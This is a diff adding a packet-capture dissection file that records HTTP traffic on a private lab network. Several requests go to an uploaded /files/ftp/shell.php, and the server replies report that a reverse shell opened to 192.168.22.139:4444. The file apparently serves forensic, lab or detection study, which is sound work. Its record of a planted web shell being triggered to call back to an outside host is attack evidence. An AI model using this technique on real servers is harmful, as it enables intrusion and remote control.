@@ -1,0 +1,505 @@
+No.     Time           Source                Destination           Protocol Length Info
+     14 0.758487307    192.168.33.10         192.168.33.1          HTTP     475    [TCP ACKed unseen segment] HTTP/1.1 200 OK  (text/html)
+
+Frame 14: 475 bytes on wire (3800 bits), 475 bytes captured (3800 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.1
+    0100 .... = Version: 4
+    .... 0101 = Header Length: 20 bytes (5)
+    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
+        0000 00.. = Differentiated Services Codepoint: Default (0)
+        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
+    Total Length: 459
+    Identification: 0xefce (61390)
+    Flags: 0x40, Don't fragment
+        0... .... = Reserved bit: Not set
+        .1.. .... = Don't fragment: Set
+        ..0. .... = More fragments: Not set
+    ...0 0000 0000 0000 = Fragment Offset: 0
+    Time to Live: 64
+    Protocol: TCP (6)
+    Header Checksum: 0x8602 [validation disabled]
+    [Header checksum status: Unverified]
+    Source Address: 192.168.33.10
+    Destination Address: 192.168.33.1
+Transmission Control Protocol, Src Port: 80, Dst Port: 48974, Seq: 1, Ack: 2, Len: 407
+    Source Port: 80
+    Destination Port: 48974
+    [Stream index: 2]
+    [Conversation completeness: Incomplete (12)]
+    [TCP Segment Len: 407]
+    Sequence Number: 1    (relative sequence number)
+    Sequence Number (raw): 63365695
+    [Next Sequence Number: 408    (relative sequence number)]
+    Acknowledgment Number: 2    (relative ack number)
+    Acknowledgment number (raw): 3374608672
+    1000 .... = Header Length: 32 bytes (8)
+    Flags: 0x018 (PSH, ACK)
+        000. .... .... = Reserved: Not set
+        ...0 .... .... = Nonce: Not set
+        .... 0... .... = Congestion Window Reduced (CWR): Not set
+        .... .0.. .... = ECN-Echo: Not set
+        .... ..0. .... = Urgent: Not set
+        .... ...1 .... = Acknowledgment: Set
+        .... .... 1... = Push: Set
+        .... .... .0.. = Reset: Not set
+        .... .... ..0. = Syn: Not set
+        .... .... ...0 = Fin: Not set
+        [TCP Flags: ·······AP···]
+    Window: 235
+    [Calculated window size: 235]
+    [Window size scaling factor: -1 (unknown)]
+    Checksum: 0x1e91 [unverified]
+    [Checksum Status: Unverified]
+    Urgent Pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - Timestamps: TSval 231873, TSecr 3110638991
+            Kind: Time Stamp Option (8)
+            Length: 10
+            Timestamp value: 231873
+            Timestamp echo reply: 3110638991
+    [Timestamps]
+        [Time since first frame in this TCP stream: 0.502165890 seconds]
+        [Time since previous frame in this TCP stream: 0.500805769 seconds]
+    [SEQ/ACK analysis]
+        [Bytes in flight: 407]
+        [Bytes sent since last PSH flag: 407]
+        [TCP Analysis Flags]
+            [Expert Info (Warning/Sequence): ACKed segment that wasn't captured (common at capture start)]
+                [ACKed segment that wasn't captured (common at capture start)]
+                [Severity level: Warning]
+                [Group: Sequence]
+    TCP payload (407 bytes)
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
+            [HTTP/1.1 200 OK\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Response Version: HTTP/1.1
+        Status Code: 200
+        [Status Code Description: OK]
+        Response Phrase: OK
+    Date: Fri, 02 Oct 2020 17:39:24 GMT\r\n
+    Server: Apache/2.4.18 (Ubuntu)\r\n
+    Vary: Accept-Encoding\r\n
+    Content-Encoding: gzip\r\n
+    Content-Length: 155\r\n
+        [Content length: 155]
+    Keep-Alive: timeout=5, max=100\r\n
+    Connection: Keep-Alive\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/3]
+    [Next request in frame: 16]
+    [Next response in frame: 18]
+    [Request URI: http://192.168.33.10/files/ftp/shell.php]
+    Content-encoded entity body (gzip): 155 bytes -> 161 bytes
+    File Data: 161 bytes
+Line-based text data: text/html (4 lines)
+    WARNING: Failed to daemonise.  This is quite common and not fatal.\n
+    Successfully opened reverse shell to 192.168.22.139:4444\n
+    ERROR: Shell connection terminated\n
+     \n
+
+No.     Time           Source                Destination           Protocol Length Info
+     16 0.885798766    192.168.33.1          192.168.33.10         HTTP     319    GET /favicon.ico HTTP/1.1 
+
+Frame 16: 319 bytes on wire (2552 bits), 319 bytes captured (2552 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.33.1, Dst: 192.168.33.10
+    0100 .... = Version: 4
+    .... 0101 = Header Length: 20 bytes (5)
+    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
+        0000 00.. = Differentiated Services Codepoint: Default (0)
+        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
+    Total Length: 303
+    Identification: 0xf475 (62581)
+    Flags: 0x40, Don't fragment
+        0... .... = Reserved bit: Not set
+        .1.. .... = Don't fragment: Set
+        ..0. .... = More fragments: Not set
+    ...0 0000 0000 0000 = Fragment Offset: 0
+    Time to Live: 64
+    Protocol: TCP (6)
+    Header Checksum: 0x81f7 [validation disabled]
+    [Header checksum status: Unverified]
+    Source Address: 192.168.33.1
+    Destination Address: 192.168.33.10
+Transmission Control Protocol, Src Port: 48974, Dst Port: 80, Seq: 2, Ack: 408, Len: 251
+    Source Port: 48974
+    Destination Port: 80
+    [Stream index: 2]
+    [Conversation completeness: Incomplete (12)]
+    [TCP Segment Len: 251]
+    Sequence Number: 2    (relative sequence number)
+    Sequence Number (raw): 3374608672
+    [Next Sequence Number: 253    (relative sequence number)]
+    Acknowledgment Number: 408    (relative ack number)
+    Acknowledgment number (raw): 63366102
+    1000 .... = Header Length: 32 bytes (8)
+    Flags: 0x018 (PSH, ACK)
+        000. .... .... = Reserved: Not set
+        ...0 .... .... = Nonce: Not set
+        .... 0... .... = Congestion Window Reduced (CWR): Not set
+        .... .0.. .... = ECN-Echo: Not set
+        .... ..0. .... = Urgent: Not set
+        .... ...1 .... = Acknowledgment: Set
+        .... .... 1... = Push: Set
+        .... .... .0.. = Reset: Not set
+        .... .... ..0. = Syn: Not set
+        .... .... ...0 = Fin: Not set
+        [TCP Flags: ·······AP···]
+    Window: 63
+    [Calculated window size: 63]
+    [Window size scaling factor: -1 (unknown)]
+    Checksum: 0x1e49 [unverified]
+    [Checksum Status: Unverified]
+    Urgent Pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - Timestamps: TSval 3110690669, TSecr 231873
+            Kind: Time Stamp Option (8)
+            Length: 10
+            Timestamp value: 3110690669
+            Timestamp echo reply: 231873
+    [Timestamps]
+        [Time since first frame in this TCP stream: 0.629477349 seconds]
+        [Time since previous frame in this TCP stream: 0.127241153 seconds]
+    TCP payload (251 bytes)
+Hypertext Transfer Protocol
+    GET /favicon.ico HTTP/1.1\r\n
+        [Expert Info (Chat/Sequence): GET /favicon.ico HTTP/1.1\r\n]
+            [GET /favicon.ico HTTP/1.1\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Request Method: GET
+        Request URI: /favicon.ico
+        Request Version: HTTP/1.1
+    Host: 192.168.33.10\r\n
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\n
+    Accept: image/webp,*/*\r\n
+    Accept-Language: en-US,en;q=0.5\r\n
+    Accept-Encoding: gzip, deflate\r\n
+    DNT: 1\r\n
+    Connection: keep-alive\r\n
+    \r\n
+    [Full request URI: http://192.168.33.10/favicon.ico]
+    [HTTP request 2/3]
+    [Response in frame: 18]
+    [Next request in frame: 34]
+
+No.     Time           Source                Destination           Protocol Length Info
+     18 0.887894163    192.168.33.10         192.168.33.1          HTTP     559    HTTP/1.1 404 Not Found  (text/html)
+
+Frame 18: 559 bytes on wire (4472 bits), 559 bytes captured (4472 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.1
+    0100 .... = Version: 4
+    .... 0101 = Header Length: 20 bytes (5)
+    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
+        0000 00.. = Differentiated Services Codepoint: Default (0)
+        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
+    Total Length: 543
+    Identification: 0xefd0 (61392)
+    Flags: 0x40, Don't fragment
+        0... .... = Reserved bit: Not set
+        .1.. .... = Don't fragment: Set
+        ..0. .... = More fragments: Not set
+    ...0 0000 0000 0000 = Fragment Offset: 0
+    Time to Live: 64
+    Protocol: TCP (6)
+    Header Checksum: 0x85ac [validation disabled]
+    [Header checksum status: Unverified]
+    Source Address: 192.168.33.10
+    Destination Address: 192.168.33.1
+Transmission Control Protocol, Src Port: 80, Dst Port: 48974, Seq: 408, Ack: 253, Len: 491
+    Source Port: 80
+    Destination Port: 48974
+    [Stream index: 2]
+    [Conversation completeness: Incomplete (12)]
+    [TCP Segment Len: 491]
+    Sequence Number: 408    (relative sequence number)
+    Sequence Number (raw): 63366102
+    [Next Sequence Number: 899    (relative sequence number)]
+    Acknowledgment Number: 253    (relative ack number)
+    Acknowledgment number (raw): 3374608923
+    1000 .... = Header Length: 32 bytes (8)
+    Flags: 0x018 (PSH, ACK)
+        000. .... .... = Reserved: Not set
+        ...0 .... .... = Nonce: Not set
+        .... 0... .... = Congestion Window Reduced (CWR): Not set
+        .... .0.. .... = ECN-Echo: Not set
+        .... ..0. .... = Urgent: Not set
+        .... ...1 .... = Acknowledgment: Set
+        .... .... 1... = Push: Set
+        .... .... .0.. = Reset: Not set
+        .... .... ..0. = Syn: Not set
+        .... .... ...0 = Fin: Not set
+        [TCP Flags: ·······AP···]
+    Window: 243
+    [Calculated window size: 243]
+    [Window size scaling factor: -1 (unknown)]
+    Checksum: 0xfdbb [unverified]
+    [Checksum Status: Unverified]
+    Urgent Pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - Timestamps: TSval 231905, TSecr 3110690669
+            Kind: Time Stamp Option (8)
+            Length: 10
+            Timestamp value: 231905
+            Timestamp echo reply: 3110690669
+    [Timestamps]
+        [Time since first frame in this TCP stream: 0.631572746 seconds]
+        [Time since previous frame in this TCP stream: 0.000941309 seconds]
+    [SEQ/ACK analysis]
+        [Bytes in flight: 491]
+        [Bytes sent since last PSH flag: 491]
+    TCP payload (491 bytes)
+Hypertext Transfer Protocol
+    HTTP/1.1 404 Not Found\r\n
+        [Expert Info (Chat/Sequence): HTTP/1.1 404 Not Found\r\n]
+            [HTTP/1.1 404 Not Found\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Response Version: HTTP/1.1
+        Status Code: 404
+        [Status Code Description: Not Found]
+        Response Phrase: Not Found
+    Date: Fri, 02 Oct 2020 17:40:16 GMT\r\n
+    Server: Apache/2.4.18 (Ubuntu)\r\n
+    Content-Length: 275\r\n
+        [Content length: 275]
+    Keep-Alive: timeout=5, max=99\r\n
+    Connection: Keep-Alive\r\n
+    Content-Type: text/html; charset=iso-8859-1\r\n
+    \r\n
+    [HTTP response 2/3]
+    [Time since request: 0.002095397 seconds]
+    [Prev response in frame: 14]
+    [Request in frame: 16]
+    [Next request in frame: 34]
+    [Next response in frame: 218]
+    [Request URI: http://192.168.33.10/favicon.ico]
+    File Data: 275 bytes
+Line-based text data: text/html (9 lines)
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n
+    <html><head>\n
+    <title>404 Not Found</title>\n
+    </head><body>\n
+    <h1>Not Found</h1>\n
+    <p>The requested URL was not found on this server.</p>\n
+    <hr>\n
+    <address>Apache/2.4.18 (Ubuntu) Server at 192.168.33.10 Port 80</address>\n
+    </body></html>\n
+
+No.     Time           Source                Destination           Protocol Length Info
+     34 5.802238366    192.168.33.1          192.168.33.10         HTTP     443    GET /files/ftp/shell.php HTTP/1.1 
+
+Frame 34: 443 bytes on wire (3544 bits), 443 bytes captured (3544 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.33.1, Dst: 192.168.33.10
+    0100 .... = Version: 4
+    .... 0101 = Header Length: 20 bytes (5)
+    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
+        0000 00.. = Differentiated Services Codepoint: Default (0)
+        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
+    Total Length: 427
+    Identification: 0xf477 (62583)
+    Flags: 0x40, Don't fragment
+        0... .... = Reserved bit: Not set
+        .1.. .... = Don't fragment: Set
+        ..0. .... = More fragments: Not set
+    ...0 0000 0000 0000 = Fragment Offset: 0
+    Time to Live: 64
+    Protocol: TCP (6)
+    Header Checksum: 0x8179 [validation disabled]
+    [Header checksum status: Unverified]
+    Source Address: 192.168.33.1
+    Destination Address: 192.168.33.10
+Transmission Control Protocol, Src Port: 48974, Dst Port: 80, Seq: 253, Ack: 899, Len: 375
+    Source Port: 48974
+    Destination Port: 80
+    [Stream index: 2]
+    [Conversation completeness: Incomplete (12)]
+    [TCP Segment Len: 375]
+    Sequence Number: 253    (relative sequence number)
+    Sequence Number (raw): 3374608923
+    [Next Sequence Number: 628    (relative sequence number)]
+    Acknowledgment Number: 899    (relative ack number)
+    Acknowledgment number (raw): 63366593
+    1000 .... = Header Length: 32 bytes (8)
+    Flags: 0x018 (PSH, ACK)
+        000. .... .... = Reserved: Not set
+        ...0 .... .... = Nonce: Not set
+        .... 0... .... = Congestion Window Reduced (CWR): Not set
+        .... .0.. .... = ECN-Echo: Not set
+        .... ..0. .... = Urgent: Not set
+        .... ...1 .... = Acknowledgment: Set
+        .... .... 1... = Push: Set
+        .... .... .0.. = Reset: Not set
+        .... .... ..0. = Syn: Not set
+        .... .... ...0 = Fin: Not set
+        [TCP Flags: ·······AP···]
+    Window: 63
+    [Calculated window size: 63]
+    [Window size scaling factor: -1 (unknown)]
+    Checksum: 0x9b6f [unverified]
+    [Checksum Status: Unverified]
+    Urgent Pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - Timestamps: TSval 3110695585, TSecr 231905
+            Kind: Time Stamp Option (8)
+            Length: 10
+            Timestamp value: 3110695585
+            Timestamp echo reply: 231905
+    [Timestamps]
+        [Time since first frame in this TCP stream: 5.545916949 seconds]
+        [Time since previous frame in this TCP stream: 4.914321105 seconds]
+    [SEQ/ACK analysis]
+        [Bytes in flight: 375]
+        [Bytes sent since last PSH flag: 375]
+    TCP payload (375 bytes)
+Hypertext Transfer Protocol
+    GET /files/ftp/shell.php HTTP/1.1\r\n
+        [Expert Info (Chat/Sequence): GET /files/ftp/shell.php HTTP/1.1\r\n]
+            [GET /files/ftp/shell.php HTTP/1.1\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Request Method: GET
+        Request URI: /files/ftp/shell.php
+        Request Version: HTTP/1.1
+    Host: 192.168.33.10\r\n
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\n
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
+    Accept-Language: en-US,en;q=0.5\r\n
+    Accept-Encoding: gzip, deflate\r\n
+    DNT: 1\r\n
+    Connection: keep-alive\r\n
+    Upgrade-Insecure-Requests: 1\r\n
+    Cache-Control: max-age=0\r\n
+    \r\n
+    [Full request URI: http://192.168.33.10/files/ftp/shell.php]
+    [HTTP request 3/3]
+    [Prev request in frame: 16]
+    [Response in frame: 218]
+
+No.     Time           Source                Destination           Protocol Length Info
+    218 99.855819591   192.168.33.10         192.168.33.1          HTTP     471    HTTP/1.1 200 OK  (text/html)
+
+Frame 218: 471 bytes on wire (3768 bits), 471 bytes captured (3768 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.1
+    0100 .... = Version: 4
+    .... 0101 = Header Length: 20 bytes (5)
+    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
+        0000 00.. = Differentiated Services Codepoint: Default (0)
+        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
+    Total Length: 455
+    Identification: 0xefd8 (61400)
+    Flags: 0x40, Don't fragment
+        0... .... = Reserved bit: Not set
+        .1.. .... = Don't fragment: Set
+        ..0. .... = More fragments: Not set
+    ...0 0000 0000 0000 = Fragment Offset: 0
+    Time to Live: 64
+    Protocol: TCP (6)
+    Header Checksum: 0x85fc [validation disabled]
+    [Header checksum status: Unverified]
+    Source Address: 192.168.33.10
+    Destination Address: 192.168.33.1
+Transmission Control Protocol, Src Port: 80, Dst Port: 48974, Seq: 899, Ack: 628, Len: 403
+    Source Port: 80
+    Destination Port: 48974
+    [Stream index: 2]
+    [Conversation completeness: Incomplete (12)]
+    [TCP Segment Len: 403]
+    Sequence Number: 899    (relative sequence number)
+    Sequence Number (raw): 63366593
+    [Next Sequence Number: 1302    (relative sequence number)]
+    Acknowledgment Number: 628    (relative ack number)
+    Acknowledgment number (raw): 3374609298
+    1000 .... = Header Length: 32 bytes (8)
+    Flags: 0x018 (PSH, ACK)
+        000. .... .... = Reserved: Not set
+        ...0 .... .... = Nonce: Not set
+        .... 0... .... = Congestion Window Reduced (CWR): Not set
+        .... .0.. .... = ECN-Echo: Not set
+        .... ..0. .... = Urgent: Not set
+        .... ...1 .... = Acknowledgment: Set
+        .... .... 1... = Push: Set
+        .... .... .0.. = Reset: Not set
+        .... .... ..0. = Syn: Not set
+        .... .... ...0 = Fin: Not set
+        [TCP Flags: ·······AP···]
+    Window: 252
+    [Calculated window size: 252]
+    [Window size scaling factor: -1 (unknown)]
+    Checksum: 0x8388 [unverified]
+    [Checksum Status: Unverified]
+    Urgent Pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - No-Operation (NOP)
+            Kind: No-Operation (1)
+        TCP Option - Timestamps: TSval 256634, TSecr 3110695585
+            Kind: Time Stamp Option (8)
+            Length: 10
+            Timestamp value: 256634
+            Timestamp echo reply: 3110695585
+    [Timestamps]
+        [Time since first frame in this TCP stream: 99.599498174 seconds]
+        [Time since previous frame in this TCP stream: 32.782611166 seconds]
+    [SEQ/ACK analysis]
+        [Bytes in flight: 403]
+        [Bytes sent since last PSH flag: 403]
+    TCP payload (403 bytes)
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
+            [HTTP/1.1 200 OK\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Response Version: HTTP/1.1
+        Status Code: 200
+        [Status Code Description: OK]
+        Response Phrase: OK
+    Date: Fri, 02 Oct 2020 17:40:21 GMT\r\n
+    Server: Apache/2.4.18 (Ubuntu)\r\n
+    Vary: Accept-Encoding\r\n
+    Content-Encoding: gzip\r\n
+    Content-Length: 152\r\n
+        [Content length: 152]
+    Keep-Alive: timeout=5, max=98\r\n
+    Connection: Keep-Alive\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 3/3]
+    [Time since request: 94.053581225 seconds]
+    [Prev request in frame: 16]
+    [Prev response in frame: 18]
+    [Request in frame: 34]
+    [Request URI: http://192.168.33.10/files/ftp/shell.php]
+    Content-encoded entity body (gzip): 152 bytes -> 158 bytes
+    File Data: 158 bytes
+Line-based text data: text/html (4 lines)
+    WARNING: Failed to daemonise.  This is quite common and not fatal.\n
+    Successfully opened reverse shell to 192.168.22.139:4444\n
+    ERROR: Shell process terminated\n
+     \n
